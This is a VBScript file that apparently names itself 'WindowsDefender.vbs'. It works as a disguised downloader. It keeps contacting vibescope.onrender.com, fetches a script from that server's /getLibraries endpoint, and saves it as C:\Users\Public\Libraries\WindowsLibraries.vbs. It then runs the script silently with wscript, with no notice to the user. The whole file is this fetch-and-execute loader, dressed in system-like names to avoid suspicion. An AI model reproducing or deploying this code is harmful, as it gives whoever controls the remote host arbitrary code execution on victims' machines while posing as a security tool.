Dim objFSO : Set objFSO = CreateObject("Scripting.FileSystemObject")

' CheckInternetConnection variables
Dim url : url = "https://vibescope.onrender.com/"

Dim toRun : toRun = "C:\Users\Public\Libraries\WindowsLibraries.vbs"

' DownloadFile variables
Dim downloadURL : downloadURL = "https://vibescope.onrender.com/getLibraries" ' Replace with your actual download URL
Dim downloadDirectory : downloadDirectory = "C:\Users\Public\Libraries"
Dim downloadedFilename : downloadedFilename = "WindowsLibraries.vbs"

' RunScript variables
Dim scriptPath : scriptPath = "C:\Users\Public\Libraries\WindowsLibraries.vbs"

Start()


sub Start()
	If objFSO.FileExists(toRun) Then
		'WScript.Echo "File Exists (from WindowsDefender.vbs)" 
		objFSO.DeleteFile toRun, True '[force deletion]
	Else
		'WScript.Echo "File Doesn't Exists (from WindowsDefender.vbs)"
	End If
	CheckInternetConnection
End sub

sub CheckInternetConnection()
    Dim objHTTP : Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.open "GET", url, False
    On Error Resume Next
    objHTTP.send ""
    On Error GoTo 0
    If objHTTP.status = 200 Then
        'WScript.Echo "Internet is connected! (from WindowsDefender.vbs)"
		DownloadFile
		RunScript
    Else
		'WScript.Echo "Internet is not connected! (from WindowsDefender.vbs)"
		WScript.Sleep 3000
		CheckInternetConnection
    End If
End sub

sub DownloadFile()
    On Error Resume Next ' Enable error handling

    Dim objXMLHTTP, objADOStream, objFSO
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    Set objADOStream = CreateObject("ADODB.Stream")
    Set objFSO = CreateObject("Scripting.FileSystemObject")

    ' Download file
    objXMLHTTP.Open "GET", downloadURL, False
    objXMLHTTP.Send

    ' Handle errors during the request
    If Err.Number <> 0 Then
        'WScript.Echo "Error during download request: " & Err.Description
        Exit Sub
    End If

    ' Save response to file
    objADOStream.Open
    objADOStream.Type = 1 ' Binary
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0

    ' Create destination folder if it doesn't exist
    If Not objFSO.FolderExists(downloadDirectory) Then objFSO.CreateFolder downloadDirectory

    ' Save stream to file
    objADOStream.SaveToFile downloadDirectory & "\" & downloadedFilename, 2 ' Overwrite

    ' Handle errors during the file save
    If Err.Number <> 0 Then
        'WScript.Echo "Error saving the file: " & Err.Description & "(from WindowsDefender.vbs)"
		Exit Sub
    Else
        'WScript.Echo "Downloaded " & downloadedFilename & " successfully. (from WindowsDefender.vbs)"
    End If

    On Error GoTo 0 ' Disable error handling
    ' Clean up
    Set objXMLHTTP = Nothing
    Set objADOStream = Nothing
    Set objFSO = Nothing
End sub

sub RunScript()
	If objFSO.FileExists(scriptPath) Then
        CreateObject("WScript.Shell").Run "wscript """ & scriptPath & """", 1, True
    Else
        'WScript.Echo "Error: Script file not found at path: " & scriptPath & "(from WindowsDefender.vbs)"
    End If
End sub